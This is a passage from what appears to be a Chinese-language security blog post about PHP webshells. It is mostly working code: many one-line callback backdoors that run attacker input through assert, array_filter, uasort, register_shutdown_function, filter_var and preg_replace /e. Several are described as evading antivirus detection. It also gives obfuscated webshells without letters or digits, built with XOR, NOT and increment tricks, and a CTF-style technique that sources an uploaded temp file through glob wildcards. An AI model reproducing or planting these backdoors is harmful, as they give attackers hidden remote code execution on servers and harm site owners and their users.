class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">call_user_func_array(&#x27;assert&#x27;, array($_REQUEST[&#x27;pass&#x27;]));</span><br></pre></td></tr></table></figure>\n<p>call_user_func_array 函数，和 call_user_func 类似，只是第二个参数可以传入参数列表组成的数组。</p>\n<h3 id=\"0x02-数组操作造成的单参数回调后门\"><a class=\"markdownIt-Anchor\" href=\"#0x02-数组操作造成的单参数回调后门\">#</a> 0x02 数组操作造成的单参数回调后门</h3>\n<p>进一步思考，在平时的 php 开发中，遇到过的带有回调参数的函数绝不止上面说的两个。这些含有回调（callable 类型）参数的函数，其实都有做 “回调后门” 的潜力。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class=\"line\">array_filter($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>\n<p>array_filter 函数是将数组中所有元素遍历并用指定函数处理过滤用的，如此调用都可以执行</p>\n<p>类似 array_filter，array_map 也有同样功效：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array($_POST[&#x27;pass&#x27;],);</span><br><span class=\"line\">array_map(base64_decode($e), $arr);</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x03-php548中的assert\"><a class=\"markdownIt-Anchor\" href=\"#0x03-php548中的assert\">#</a> 0x03 php5.4.8 + 中的 assert</h3>\n<p>php 5.4.8 + 后的版本，assert 函数由一个参数，增加了一个可选参数 descrition：</p>\n<p>这就增加（改变）了一个很好的 “执行代码” 的方法 assert，这个函数可以有一个参数，也可以有两个参数。那么以前回调后门中有两个参数的回调函数，现在就可以使用了。</p>\n<p>比如如下回调后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]);</span><br><span class=\"line\">uasort($arr, base64_decode($e));</span><br></pre></td></tr></table></figure>\n<p>同样的道理，这个也是功能类似：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2);</span><br><span class=\"line\">uksort($arr, $e);</span><br></pre></td></tr></table></figure>\n<p>再给出这两个函数，面向对象的方法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">// way 0</span><br><span class=\"line\">$arr = new ArrayObject(array(&#x27;test&#x27;, $_REQUEST[&#x27;pass&#x27;]));</span><br><span class=\"line\">$arr-&gt;uasort(&#x27;assert&#x27;);</span><br><span class=\"line\"></span><br><span class=\"line\">// way 1</span><br><span class=\"line\">$arr = new ArrayObject(array(&#x27;test&#x27; =&gt; 1, $_REQUEST[&#x27;pass&#x27;] =&gt; 2));</span><br><span class=\"line\">$arr-&gt;uksort(&#x27;assert&#x27;);</span><br></pre></td></tr></table></figure>\n<p>再来两个类似的回调后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array(1);</span><br><span class=\"line\">array_reduce($arr, $e, $_POST[&#x27;pass&#x27;]);</span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array($_POST[&#x27;pass&#x27;]);</span><br><span class=\"line\">$arr2 = array(1);</span><br><span class=\"line\">array_udiff($arr, $arr2, $e);</span><br></pre></td></tr></table></figure>\n<p>以上几个都是可以直接菜刀连接的一句话，但目标 PHP 版本在 5.4.8 及以上才可用。</p>\n<p>我把上面几个类型归为：二参数回调函数（也就是回调函数的格式是需要两个参数的）</p>\n<h3 id=\"0x04-三参数回调函数\"><a class=\"markdownIt-Anchor\" href=\"#0x04-三参数回调函数\">#</a> 0x04 三参数回调函数</h3>\n<p>有些函数需要的回调函数类型比较苛刻，回调格式需要三个参数。比如 array_walk。</p>\n<p>array_walk 的第二个参数是 callable 类型，正常情况下它是格式是两个参数的，但在 0x03 中说了，两个参数的回调后门需要使用 php5.4.8 后的 assert，在 5.3 就不好用了。但这个回调其实也可以接受三个参数，那就好办了：</p>\n<p>php 中，可以执行代码的函数：</p>\n<ol>\n<li>一个参数：assert</li>\n<li>两个参数：assert （php5.4.8+）</li>\n<li>三个参数：preg_replace /e 模式</li>\n</ol>\n<p>三个参数可以用 preg_replace。所以我这里构造了一个 array_walk + preg_replace 的回调后门：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class=\"line\">array_walk($arr, $e, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>\n<p>PHP 拥有那么多灵活的函数，稍微改个函数（array_walk_recursive）</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">$arr = array($_POST[&#x27;pass&#x27;] =&gt; &#x27;|.*|e&#x27;,);</span><br><span class=\"line\">array_walk_recursive($arr, $e, &#x27;&#x27;);</span><br></pre></td></tr></table></figure>\n<p>其实 php 里不止这个函数可以执行 eval 的功能，还有几个类似的：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">mb_ereg_replace(&#x27;.*&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;, &#x27;e&#x27;);</span><br></pre></td></tr></table></figure>\n<p>另一个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">echo preg_filter(&#x27;|.*|e&#x27;, $_REQUEST[&#x27;pass&#x27;], &#x27;&#x27;);</span><br></pre></td></tr></table></figure>\n<h3 id=\"0x05-单参数后门终极奥义\"><a class=\"markdownIt-Anchor\" href=\"#0x05-单参数后门终极奥义\">#</a> 0x05 单参数后门终极奥义</h3>\n<p>preg_replace、三参数后门虽然好用，但 /e 模式 php5.5 以后就废弃了，不知道哪天就会给删了。所以我觉得还是单参数后门，在各个版本都比较好驾驭。</p>\n<p>这里给出几个好用不杀的回调后门</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">register_shutdown_function($e, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>这个是 php 全版本支持的，且不报不杀稳定执行：</p>\n<p>再来一个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$e = $_REQUEST[&#x27;e&#x27;];</span><br><span class=\"line\">declare(ticks=1);</span><br><span class=\"line\">register_tick_function ($e, $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>再来两个：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">filter_var($_REQUEST[&#x27;pass&#x27;], FILTER_CALLBACK, array(&#x27;options&#x27; =&gt; &#x27;assert&#x27;));</span><br><span class=\"line\">filter_var_array(array(&#x27;test&#x27; =&gt; $_REQUEST[&#x27;pass&#x27;]), array(&#x27;test&#x27; =&gt; array(&#x27;filter&#x27; =&gt; FILTER_CALLBACK, &#x27;options&#x27; =&gt; &#x27;assert&#x27;)));</span><br></pre></td></tr></table></figure>\n<p>这两个是 filter_var 的利用，php 里用这个函数来过滤数组，只要指定过滤方法为回调（FILTER_CALLBACK），且 option 为 assert 即可。</p>\n<p>这几个单参数回调后门非常隐蔽，基本没特征</p>\n<h3 id=\"0x06-其他参数型回调后门\"><a class=\"markdownIt-Anchor\" href=\"#0x06-其他参数型回调后门\">#</a> 0x06 其他参数型回调后门</h3>\n<p>上面说了，回调函数格式为 1、2、3 参数的时候，可以利用 assert、assert、preg_replace 来执行代码。但如果回调函数的格式是其他参数数目，或者参数类型不是简单字符串，怎么办？</p>\n<p>举个例子，php5.5 以后建议用 preg_replace_callback 代替 preg_replace 的 /e 模式来处理正则执行替换，那么其实 preg_replace_callback 也是可以构造回调后门的。</p>\n<p>preg_replace_callback 的第二个参数是回调函数，但这个回调函数被传入的参数是一个数组，如果直接将这个指定为 assert，就会执行不了，因为 assert 接受的参数是字符串。</p>\n<p>所以我们需要去 “构造” 一个满足条件的回调函数。</p>\n<p>怎么构造？使用 create_function：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">preg_replace_callback(&#x27;/.+/i&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;), $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>\n<p>“创造” 一个函数，它接受一个数组，并将数组的第一个元素 $arr [0] 传入 assert。</p>\n<p>这也是一个不杀不报稳定执行的回调后门，但因为有 create_function 这个敏感函数，所以看起来总是不太爽。不过也是没办法的事。</p>\n<p>类似的，这个也同样：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">mb_ereg_replace_callback(&#x27;.+&#x27;, create_function(&#x27;$arr&#x27;, &#x27;return assert($arr[0]);&#x27;), $_REQUEST[&#x27;pass&#x27;]);</span><br></pre></td></tr></table></figure>\n<h2 id=\"一些不包含数字和字母的webshell\"><a class=\"markdownIt-Anchor\" href=\"#一些不包含数字和字母的webshell\">#</a> 一些不包含数字和字母的 webshell</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(!preg_match(&#x27;/[a-z0-9]/is&#x27;,$_GET[&#x27;shell&#x27;])) &#123;</span><br><span class=\"line\">  eval($_GET[&#x27;shell&#x27;]);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>核心思路是，将非字母、数字的字符经过各种变换，最后能构造出 a-z 中任意一个字符。然后再利用 PHP 允许动态函数执行的特点，拼接处一个函数名，如 “assert”，然后动态执行之即可。</p>\n<p>那么，<strong>变换方法</strong> 将是解决本题的要点。</p>\n<p>不过在此之前，我需要说说 php5 和 7 的差异。</p>\n<p>php5 中 assert 是一个函数，我们可以通过 <code>$f='assert';$f(...);</code>  这样的方法来动态执行任意代码。</p>\n<p>但 php7 中，assert 不再是函数，变成了一个语言结构（类似 eval），不能再作为函数名动态执行代码，所以利用起来稍微复杂一点。但也无需过于担心，比如我们利用 file_put_contents 函数，同样可以用来 getshell。</p>\n<h3 id=\"方法一\"><a class=\"markdownIt-Anchor\" href=\"#方法一\">#</a> 方法一</h3>\n<p>这是最简单、最容易想到的方法。在 PHP 中，两个字符串执行异或操作以后，得到的还是一个字符串。所以，我们想得到 a-z 中某个字母，就找到某两个非字母、数字的字符，他们的异或结果是这个字母即可。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=(&#x27;%01&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%13&#x27;^&#x27;`&#x27;).(&#x27;%05&#x27;^&#x27;`&#x27;).(&#x27;%12&#x27;^&#x27;`&#x27;).(&#x27;%14&#x27;^&#x27;`&#x27;); // $_=&#x27;assert&#x27;;</span><br><span class=\"line\">$__=&#x27;_&#x27;.(&#x27;%0D&#x27;^&#x27;]&#x27;).(&#x27;%2F&#x27;^&#x27;`&#x27;).(&#x27;%0E&#x27;^&#x27;]&#x27;).(&#x27;%09&#x27;^&#x27;]&#x27;); // $__=&#x27;_POST&#x27;;</span><br><span class=\"line\">$___=$$__;</span><br><span class=\"line\">$_($___[_]); // assert($_POST[_]);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161730587.png\" alt=\"image-20221222161730587\"></p>\n<h3 id=\"方法二\"><a class=\"markdownIt-Anchor\" href=\"#方法二\">#</a> 方法二</h3>\n<p>和方法一有异曲同工之妙，唯一差异就是，方法一使用的是位运算里的 “异或”，方法二使用的是位运算里的 “取反”。</p>\n<p>方法二利用的是 UTF-8 编码的某个汉字，并将其中某个字符取出来，比如 <code>'和'&#123;2&#125;</code>  的结果是 <code>&quot;\\x8c&quot;</code> ，其取反即为字母 <code>s</code> ：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161822603.png\" alt=\"image-20221222161822603\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$__=(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;)+(&#x27;&gt;&#x27;&gt;&#x27;&lt;&#x27;);</span><br><span class=\"line\">$_=$__/$__;</span><br><span class=\"line\"></span><br><span class=\"line\">$____=&#x27;&#x27;;</span><br><span class=\"line\">$___=&quot;瞰&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;和&quot;;$____.=~($___&#123;$__&#125;);$___=&quot;的&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;半&quot;;$____.=~($___&#123;$_&#125;);$___=&quot;始&quot;;$____.=~($___&#123;$__&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$_____=&#x27;_&#x27;;$___=&quot;俯&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;瞰&quot;;$_____.=~($___&#123;$__&#125;);$___=&quot;次&quot;;$_____.=~($___&#123;$_&#125;);$___=&quot;站&quot;;$_____.=~($___&#123;$_&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">$_=$$_____;</span><br><span class=\"line\">$____($_[$__]);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222161952864.png\" alt=\"image-20221222161952864\"></p>\n<p>这个答案还利用了 PHP 的弱类型特性。因为要获取 <code>'和'&#123;2&#125;</code> ，就必须有数字 2。而 PHP 由于弱类型这个特性，true 的值为 1，故 <code>true+true==2</code> ，也就是 <code>('&gt;'&gt;'&lt;')+('&gt;'&gt;'&lt;')==2</code> 。</p>\n<h3 id=\"方法三\"><a class=\"markdownIt-Anchor\" href=\"#方法三\">#</a> 方法三</h3>\n<p>这就得借助 PHP 的一个小技巧，先看文档： <span class=\"exturl\" data-url=\"aHR0cDovL3BocC5uZXQvbWFudWFsL3poL2xhbmd1YWdlLm9wZXJhdG9ycy5pbmNyZW1lbnQucGhw\">http://php.net/manual/zh/language.operators.increment.php</span></p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162055456.png\" alt=\"image-20221222162055456\"></p>\n<p>也就是说， <code>'a'++ =&gt; 'b'</code> ， <code>'b'++ =&gt; 'c'</code> … 所以，我们只要能拿到一个变量，其值为 <code>a</code> ，通过自增操作即可获得 a-z 中所有字符。</p>\n<p>那么，如何拿到一个值为字符串’a’的变量呢？</p>\n<p>巧了，数组（Array）的第一个字母就是大写 A，而且第 4 个字母是小写 a。也就是说，我们可以同时拿到小写和大写 A，等于我们就可以拿到 a-z 和 A-Z 的所有字母。</p>\n<p>在 PHP 中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为 <code>Array</code> ：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162132570.png\" alt=\"image-20221222162132570\"></p>\n<p>再取这个字符串的第一个字母，就可以获得’A’了。</p>\n<p>利用这个技巧，我编写了如下 webshell（因为 PHP 函数是大小写不敏感的，所以我们最终执行的是 <code>ASSERT($_POST[_])</code> ，无需获取小写 a）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$_=[];</span><br><span class=\"line\">$_=@&quot;$_&quot;; // $_=&#x27;Array&#x27;;</span><br><span class=\"line\">$_=$_[&#x27;!&#x27;==&#x27;@&#x27;]; // $_=$_[0];</span><br><span class=\"line\">$___=$_; // A</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;</span><br><span class=\"line\">$___.=$__; // S</span><br><span class=\"line\">$___.=$__; // S</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++; // E </span><br><span class=\"line\">$___.=$__;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // R</span><br><span class=\"line\">$___.=$__;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class=\"line\">$___.=$__;</span><br><span class=\"line\"></span><br><span class=\"line\">$____=&#x27;_&#x27;;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // P</span><br><span class=\"line\">$____.=$__;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // O</span><br><span class=\"line\">$____.=$__;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // S</span><br><span class=\"line\">$____.=$__;</span><br><span class=\"line\">$__=$_;</span><br><span class=\"line\">$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++; // T</span><br><span class=\"line\">$____.=$__;</span><br><span class=\"line\"></span><br><span class=\"line\">$_=$$____;</span><br><span class=\"line\">$___($_[_]); // ASSERT($_POST[_]);</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20221222162209960.png\" alt=\"image-20221222162209960\"></p>\n<h2 id=\"无字母数字webshell之命令执行\"><a class=\"markdownIt-Anchor\" href=\"#无字母数字webshell之命令执行\">#</a> 无字母数字 webshell 之命令执行</h2>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">if(isset($_GET[&#x27;code&#x27;]))&#123;</span><br><span class=\"line\">    $code = $_GET[&#x27;code&#x27;];</span><br><span class=\"line\">    if(strlen($code)&gt;35)&#123;</span><br><span class=\"line\">        die(&quot;Long.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    if(preg_match(&quot;/[A-Za-z0-9_$]+/&quot;,$code))&#123;</span><br><span class=\"line\">        die(&quot;NO.&quot;);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    eval($code);</span><br><span class=\"line\">&#125;else&#123;</span><br><span class=\"line\">    highlight_file(__FILE__);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>这道题的限制：</p>\n<ol>\n<li>webshell 长度不超过 35 位</li>\n<li>除了不包含字母数字，还不能包含 <code>$</code>  和 <code>_</code></li>\n</ol>\n<p>难点呼之欲出了，我前面文章中给出的所有方法，都用到了 PHP 中的变量，需要对变量进行变形、异或、取反等操作，最后动态执行函数。但现在，因为 <code>$</code>  不能使用了，所以我们无法构造 PHP 中的变量。</p>\n<h3 id=\"php7-下简单解决问题\"><a class=\"markdownIt-Anchor\" href=\"#php7-下简单解决问题\">#</a> PHP7 下简单解决问题</h3>\n<p>PHP7 前是不允许用 <code>($a)();</code>  这样的方法来执行动态函数的，但 PHP7 中增加了对此的支持。所以，我们可以通过 <code>('phpinfo')();</code>  来执行函数，第一个括号中可以是任意 PHP 表达式。</p>\n<p>所以很简单了，构造一个可以生成 <code>phpinfo</code>  这个字符串的 PHP 表达式即可。payload 如下（不可见字符用 url 编码表示）：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(~%8F%97%8F%96%91%99%90)();</span><br></pre></td></tr></table></figure>\n<h3 id=\"php5的思考\"><a class=\"markdownIt-Anchor\" href=\"#php5的思考\">#</a> PHP5 的思考</h3>\n<p>PHP 自然也能够和操作系统进行交互，“反引号” 就是 PHP 中最简单的执行 shell 的方法。那么，在使用 PHP 无法解决问题的情况下，为何不考虑用 “反引号”+“shell” 的方式来 getshell 呢？</p>\n<p>因为反引号不属于 “字母”、“数字”，所以我们可以执行系统命令，但问题来了：如何利用无字母、数字、 <code>$</code>  的系统命令来 getshell？</p>\n<p>好像问题又回到了原点：无字母、数字、 <code>$</code> ，在 shell 中仍然是一个难题。</p>\n<p>此时我想到了两个有趣的 Linux shell 知识点：</p>\n<ol>\n<li>shell 下可以利用 <code>.</code>  来执行任意脚本</li>\n<li>Linux 文件名支持用 glob 通配符代替</li>\n</ol>\n<p><code>.</code>  或者叫 period，它的作用和 source 一样，就是用当前的 shell 执行一个文件中的命令。比如，当前运行的 shell 是 bash，则 <code>. file</code>  的意思就是用 bash 执行 file 文件中的命令。</p>\n<p>用 <code>. file</code>  执行文件，是不需要 file 有 x 权限的。那么，如果目标服务器上有一个我们可控的文件，那不就可以利用 <code>.</code>  来执行它了吗？</p>\n<p>这个文件也很好得到，我们可以发送一个上传文件的 POST 包，此时 PHP 会将我们上传的文件保存在临时文件夹下，默认的文件名是 <code>/tmp/phpXXXXXX</code> ，文件名最后 6 个字符是随机的大小写字母。</p>\n<p>第二个难题接踵而至，执行 <code>. /tmp/phpXXXXXX</code> ，也是有字母的。此时就可以用到 Linux 下的 glob 通配符：</p>\n<ul>\n<li><code>*</code>  可以代替 0 个及以上任意字符</li>\n<li><code>?</code>  可以代表 1 个任意字符</li>\n</ul>\n<p>那么， <code>/tmp/phpXXXXXX</code>  就可以表示为 <code>/*/?????????</code>  或 <code>/???/?????????</code> 。</p>\n<p>但我们尝试执行 <code>. /???/?????????</code> ，却得到如下错误：</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/19ba62d6-9f8a-40a6-a3f9-833deca218d5.1d1534b39994.png\" alt=\"image.png\"></p>\n<p>这是因为，能够匹配上 <code>/???/?????????</code>  这个通配符的文件有很多，我们可以列出来：</p>\n<p><img data-src=\"https://www.leavesongs.com/media/attachment/2018/10/06/67a4aab1-9e90-43e6-b3f1-3569c7009390.423d9ca7066c.png\" alt=\"image.png\"></p>\n<p>可见，我们要执行的 <code>/tmp/phpcjggLC</code>  排在倒数第二位。然而，在执行第一个匹配上的文件（即 <code>/bin/run-parts</code> ）的时候就已经出现了错误，导致整个流程停止，根本不会执行到我们上传的文件。</p>\n<p>其中，glob 支持用 <code>[^x]</code>  的方法来构造 “这个位置不是字符 x”。那么，我们用这个姿势干掉 <code>/bin/run-parts</code> ：</p>\n<p>[<img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/0a5b0800-1a01-4738-831f-f597795255e0.63b17aebf66d.png\" alt=\"image.png\"></p>\n<p>排除了第 4 个字符是 <code>-</code>  的文件，同样我们可以排除包含 <code>.</code>  的文件：</p>\n<p>[<img data-src=\"https://www.leavesongs.com/media/attachment/2018/10/06/1553332a-76fe-4a0a-a8db-7f1ae410c85c.4bb210f52740.png\" alt=\"image.png\">]</p>\n<p>现在就剩最后三个文件了。但我们要执行的文件仍然排在最后，但我发现这三个文件名中都不包含特殊字符，那么这个方法似乎行不通了。</p>\n<p>继续阅读 glob 的帮助，我发现另一个有趣的用法：</p>\n<p>[<img data-src=\"https://www.leavesongs.com/media/attachment/2018/10/06/1bbd6606-f2bc-4b7d-8374-a8e501e0b93a.3c485a5bb8eb.png\" alt=\"image.png\">]</p>\n<p>就跟正则表达式类似，glob 支持利用 <code>[0-9]</code>  来表示一个范围。</p>\n<p>我们再来看看之前列出可能干扰我们的文件：</p>\n<p>[<img 